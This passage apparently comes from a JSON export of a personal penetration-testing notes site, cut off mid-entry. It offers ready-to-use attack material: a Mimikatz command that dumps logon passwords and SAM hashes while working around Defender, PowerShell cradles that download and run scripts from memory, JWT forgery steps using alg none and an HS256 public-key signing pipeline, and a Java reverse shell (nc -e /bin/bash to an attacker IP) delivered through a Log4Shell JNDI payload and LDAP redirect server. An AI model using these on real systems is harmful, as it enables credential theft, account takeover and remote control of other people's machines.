&quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;&#039; &gt; C:\\mkat.txt\nNote that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.","richContent":"&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Mimikatz&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Mimikatz&quot;&gt;Mimikatz&lt;/a&gt; binaries are generally detected by AV on download these days, but fortunately there’s a PowerShell &lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;re-implementation available from the Empire Project&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; that can be run after bypassing AMSI.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-Mimikatz&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Command &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::sam&quot; &quot;exit&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; C:\\mkat.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.&lt;/p&gt;"},"spells/Invoke-WebRequest":{"slug":"spells/Invoke-WebRequest","filePath":"spells/Invoke-WebRequest.md","title":"Invoke-WebRequest","links":[],"tags":["Application/PowerShell"],"content":"# Download to disk\n#\nInvoke-WebRequest -Uri $URL_OF_FILE -OutFile $FILE_ON_DISK\n \n# Download into a variable (useful for scripts!)\n#\n$SCRIPT_DATA = `\n\t(New-Object System.Net.Webclient).DownloadString(&quot;$SCRIPT_URL&quot;)\n \n# Download and invoke from memory\n#\nIEX (New-Object System.Net.Webclient).DownloadString(&quot;$SCRIPT_URL&quot;)","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Download to disk&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;Invoke-WebRequest&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;Uri &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;URL_OF_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; -&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;OutFile &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;FILE_ON_DISK&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Download into a variable (useful for scripts!)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;SCRIPT_DATA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; `&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Net.Webclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.DownloadString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SCRIPT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Download and invoke from memory&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;IEX &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;New-Object&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; System.Net.Webclient&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.DownloadString&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;SCRIPT_URL&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;"},"spells/JSON-Web-Tokens":{"slug":"spells/JSON-Web-Tokens","filePath":"spells/JSON Web Tokens.md","title":"JSON Web Tokens (JWTs)","links":["spells/HTTP","spells/basenc"],"tags":["Standard/JWT","AttackCycle/Exploitation","AttackCycle/Exploitation/BruteForcing","Protocol/HTTP","Cryptography/Signatures"],"content":"JSON web token format: $HEADER.$PAYLOAD.$SIGNATURE, where each substring is (URL-safe) base64 encoded. These can be passed around as a user cookie, HTTP header, or queried from local storage.\n$HEADER and $PAYLOAD are both JSON blobs, but $SIGNATURE is binary data.\n\n$HEADER takes the form { &quot;alg&quot;: &quot;RS256&quot;, &quot;typ&quot;: &quot;JWT&quot; }, where alg is a signing algorithm supported by the server.\n$PAYLOAD is a JSON blob containing various pieces of user information, which can include permissioning data. See jwt.io for a detailed breakdown.\n$SIGNATURE is the signature (using alg from the $HEADER) of $HEADER.$PAYLOAD (both parts base64 encoded) using a server-side secret (often an SSL key… but sometimes just a string!).\n\nUse basenc (basenc --base64url and basenc -d --base64url) to encode/decode URL-safe base64, rather than the base64 binary. Be sure to strip the trailing = signs!\n“None” signature attacks\nSometimes servers will also support the NONE signature type, which indicates that no signing is used (so the JWT is then just $HEADER.$PAYLOAD. — note the trailing dot!). If the server allows the NONE signing method, then it’s often possible to just arbitrarily edit the $PAYLOAD to gain access to other users.\nThe base64-encoded version of {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;} is eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.\nPublic key attacks\nJWT algorithms can use a server’s public key if alg is HS256. If the public half of the keypair used to sign the JWT is available somehow (for example, if it’s been re-used as the server’s HTTPS certificate), then we can harvest it and use it to forge new JWTs.\nThe base64-encoded version of {&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;} is eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.\nUse the following to generate a signature with the above $HEADER and the PEM-formatted $PUBLIC_KEY_FILE half of the public/private key to validate the JWTs (when alg is RS256):\necho -n &quot;$HEADER.$PAYLOAD&quot; | \\\nopenssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat $PUBLIC_KEY_FILE | xxd -p | tr -d &#039;\n&#039;) | \\\nsed -e &#039;s/.*= //&#039; | \\\ntr -d &#039;\n&#039; | \\\nxxd -p -r | \\\nbasenc --base64url | \\\nsed -e &#039;s/=*$//&#039;\nBrute-forcing weak secrets\nIf a weak secret (a simple string) is used to sign the JWT token, then it is sometimes possible to brute-force it using JWT-Cracker.","richContent":"&lt;p&gt;&lt;a href=&quot;https://jwt.io&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;JSON web token&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; format: &lt;code&gt;$HEADER.$PAYLOAD.$SIGNATURE&lt;/code&gt;, where each substring is (URL-safe) base64 encoded. These can be passed around as a user cookie, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; header, or queried from local storage.&lt;/p&gt;\n&lt;p&gt;&lt;code&gt;$HEADER&lt;/code&gt; and &lt;code&gt;$PAYLOAD&lt;/code&gt; are both JSON blobs, but &lt;code&gt;$SIGNATURE&lt;/code&gt; is binary data.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;$HEADER&lt;/code&gt; takes the form &lt;code&gt;{ &quot;alg&quot;: &quot;RS256&quot;, &quot;typ&quot;: &quot;JWT&quot; }&lt;/code&gt;, where &lt;code&gt;alg&lt;/code&gt; is a signing algorithm supported by the server.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$PAYLOAD&lt;/code&gt; is a JSON blob containing various pieces of user information, which can include permissioning data. See jwt.io for a detailed breakdown.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;$SIGNATURE&lt;/code&gt; is the signature (using &lt;code&gt;alg&lt;/code&gt; from the &lt;code&gt;$HEADER&lt;/code&gt;) of &lt;code&gt;$HEADER.$PAYLOAD&lt;/code&gt; (both parts base64 encoded) using a server-side secret (often an SSL key… but sometimes just a string!).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/basenc&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/basenc&quot;&gt;basenc&lt;/a&gt; (&lt;code&gt;basenc --base64url&lt;/code&gt; and &lt;code&gt;basenc -d --base64url&lt;/code&gt;) to encode/decode URL-safe base64, rather than the base64 binary. Be sure to strip the trailing &lt;code&gt;=&lt;/code&gt; signs!&lt;/p&gt;\n&lt;h2 id=&quot;none-signature-attacks&quot;&gt;“None” signature attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#none-signature-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Sometimes servers will also support the NONE signature type, which indicates that no signing is used (so the JWT is then just &lt;code&gt;$HEADER.$PAYLOAD.&lt;/code&gt; — note the trailing dot!). If the server allows the NONE signing method, then it’s often possible to just arbitrarily edit the &lt;code&gt;$PAYLOAD&lt;/code&gt; to gain access to other users.&lt;/p&gt;\n&lt;p&gt;The base64-encoded version of &lt;code&gt;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;}&lt;/code&gt; is &lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0&lt;/code&gt;.&lt;/p&gt;\n&lt;h2 id=&quot;public-key-attacks&quot;&gt;Public key attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#public-key-attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;JWT algorithms can use a server’s &lt;em&gt;public&lt;/em&gt; key if &lt;code&gt;alg&lt;/code&gt; is &lt;code&gt;HS256&lt;/code&gt;. If the public half of the keypair used to sign the JWT is available somehow (for example, if it’s been re-used as the server’s HTTPS certificate), then we can harvest it and use it to forge new JWTs.&lt;/p&gt;\n&lt;p&gt;The base64-encoded version of &lt;code&gt;{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;}&lt;/code&gt; is &lt;code&gt;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Use the following to generate a signature with the above &lt;code&gt;$HEADER&lt;/code&gt; and the PEM-formatted &lt;code&gt;$PUBLIC_KEY_FILE&lt;/code&gt; half of the public/private key to validate the JWTs (when &lt;code&gt;alg&lt;/code&gt; is &lt;code&gt;RS256&lt;/code&gt;):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -n&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$HEADER.$PAYLOAD&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;openssl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dgst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sha256&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -mac&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; HMAC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -macopt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; hexkey:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $PUBLIC_KEY_FILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; xxd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; tr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/.*= //&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;tr&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;xxd&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;basenc&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --base64url&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sed&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;s/=*$//&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;brute-forcing-weak-secrets&quot;&gt;Brute-forcing weak secrets&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#brute-forcing-weak-secrets&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;em&gt;If&lt;/em&gt; a weak secret (a simple string) is used to sign the JWT token, then it is sometimes possible to brute-force it using &lt;a href=&quot;https://github.com/lmammino/jwt-cracker&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;JWT-Cracker&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;.&lt;/p&gt;"},"spells/Java":{"slug":"spells/Java","filePath":"spells/Java.md","title":"Java","links":["spells/netcat","spells/HTTP","spells/Quick-n-dirty-Python-web-server"],"tags":["Language/Java","Application/netcat","Protocol/HTTP","OS/Linux/Distros/Kali","AttackCycle/Exploitation"],"content":"Reverse shell\nA simple Java exploit that pops a reverse shell (at least on Linux systems with a version of netcat that supports the -e switch) is:\npublic class Exploit {\n\tstatic {\n\t\ttry {\n\t\t\tjava.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash 1.2.3.4 9999&quot;);\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}\nWhere 1.2.3.4 is the IP you’re catching the reverse shell at and 9999 is the port of the listener. This can be compiled with:\njavac Exploit.java -source 8 -target 8\nNote that the -source and -target flags may need to be modified depending on which version of Java the target is running. As with all things Java, the file name and file class name need to match.\nDelivery with Log4Shell\nDelivery through a vulnerable version of Log4j is done through a four step process: Malicious string → LDAP lookup → load Java code over HTTP → reverse shell.\nA simple Java LDAP server that will handle redirects is available at github.com/mbechler/marshalsec. It can be built with Apache Maven using the version of OpenJDK supplied with Kali Linux:\nmvn clean package -DskipTests\nThen run with:\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \\\n         marshalsec.jndi.LDAPRefServer \\\n         &quot;http://$ATTACKER_IP:$ATTACKER_PORT/#Exploit&quot;\nWhere $ATTACKER_IP and $ATTACKER_PORT are the IP address and port of an HTTP server that will be used to actually serve up the exploit.\nOnce that’s done you’ll just need to fire up a quick web server to serve appropriate exploit code (like the example reverse shell above) and a netcat listener, and then find a way to deliver the malicious string (${jndi:ldap://1.2.3.4:1389/Exploit}, where 1.2.3.4 is the $ATTACKER_IP above) somewhere it will be logged.\nNote that a number of other protocols are supported besides LDAP (the marchalsec server supports a few).","richContent":"&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#reverse-shell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 